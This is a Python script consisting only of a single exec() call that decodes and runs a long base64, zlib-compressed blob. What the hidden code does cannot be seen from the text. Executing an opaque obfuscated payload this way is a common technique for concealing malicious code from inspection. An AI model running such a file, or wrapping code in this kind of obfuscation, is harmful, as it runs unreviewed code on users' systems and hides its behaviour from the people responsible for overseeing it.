import zlib,base64
exec(zlib.decompress(base64.b64decode("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")))